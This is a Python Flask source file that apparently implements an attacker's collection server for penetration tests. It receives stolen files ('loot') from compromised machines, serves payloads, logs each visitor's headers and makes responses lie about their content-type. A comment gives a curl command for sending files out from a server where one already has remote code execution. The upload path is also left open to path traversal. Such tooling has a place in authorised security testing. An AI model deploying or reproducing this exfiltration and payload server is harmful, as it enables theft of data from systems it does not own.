from flask import Flask
from flask import render_template
from flask import redirect
from flask import url_for
from flask import request, session, send_file, send_from_directory, make_response
from flask import make_response # for setting cookies
import flask
import os
import subprocess
import ipdb
import datetime

APP_ROOT = os.path.dirname(os.path.abspath(__file__))

LOOT_DIR = os.path.join(APP_ROOT, 'loot') # Store uploaded files in this dir
PAYLOAD_DIR = os.path.join(APP_ROOT, 'payloads') # Files in this dir will be served at /payload/<filename>

# Create a directory if it doesn't exist
def ensure_directory(dirname):
    if not os.path.exists(dirname):
        os.makedirs(dirname)

app = Flask(__name__, static_url_path=PAYLOAD_DIR)
ensure_directory(LOOT_DIR)
ensure_directory(PAYLOAD_DIR)

##########
# Routes #
##########

# If you have RCE on a server, you can upload a file to this endpoint with:
#   curl -X POST --data-binary @path/to/filename.txt this_servers_ip:port/file?filename=fileToSaveAs.txt
#
# --data-binary preserves newlines in files that are extracted
#
# Note: this stores uploaded files to disk for easy perusal later, so if someone
# malicious starts hitting this endpoint they could fill up your harddrive.
@app.route("/file", methods=["POST"])
def file():
    print()
    log_meta_info(request)
    # TODO: ensure request can't write outside of LOOT_DIR
    filename = get_loot_filename(request.args.get('filename'))

    file_already_exists = False

    if os.path.exists(filename):
        print("[!] Warning, file already exists, not overwriting. Please specify a new file path")
        file_already_exists = True

    print()
    if not file_already_exists:
        print("File content saved to: %s" % filename)
    print("-----------------------")
    # Read filename out of URL param
    with open(filename, 'w') as f:
        for x in request.form.keys():
            print(x)
            if not file_already_exists:
                f.write(x)

    print("-----------------------")

    return "OK"

@app.route('/payloads/<path:path>')
def payloads(path):
    log_meta_info(request)
    print()
    print("Served file: %s" % os.path.join(os.path.basename(PAYLOAD_DIR), path))

    # This is an example of how to make the server lie about a file's content-type
    if path == "spoof_content.txt":
        r = make_response(send_from_directory(PAYLOAD_DIR, path))
        r.headers.set('Content-Type', 'image/svg+xml')
        return r

    return send_from_directory(PAYLOAD_DIR, path)


# Thanks: http://flask.pocoo.org/snippets/57/
@app.route("/", defaults={'path':''})
@app.route('/<path:path>')
def index(path):
    log_meta_info(request)
    print("Visited: %s" % path)
    return "OK"

# Helper methods

def log_meta_info(request):
    print("[*] %s - %s - From: %s" % (datetime.datetime.now(), request.method, request.remote_addr) )
    for header, value in request.headers.to_wsgi_list():
        print("  %s: %s" % (header, value))

# File to store uploaded file in locally
def get_loot_filename(filename):
    return os.path.join(LOOT_DIR, filename)

#################
# Server config #
#################

app.secret_key = "blah-doesn't-matter"

if __name__ == "__main__":
    # app.debug = True
    app.run(host='0.0.0.0') # Note: this makes the server publicly accessible, be careful my friend

    #############################################
    # Example of running this server over HTTPS #
    #############################################

    # Create a self-signed certificate
    #   Copied from: https://www.linux.com/learn/creating-self-signed-ssl-certificates-apache-linux
    #
    # $ sudo openssl req -new > new.ssl.csr
    # $ sudo openssl rsa -in privkey.pem -out new.cert.key
    # $ sudo openssl x509 -in new.ssl.csr -out new.cert.cert -req -signkey new.cert.key -days NNN
    #
    # Uncomment below and specify the path to new.cert.cert and new.cert.key.
    # import ssl
    # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    # context.load_cert_chain('path/to/yourcert.cert', 'path/to/yourkey.key')
    # app.run(ssl_context=context, host='0.0.0.0', port=443)
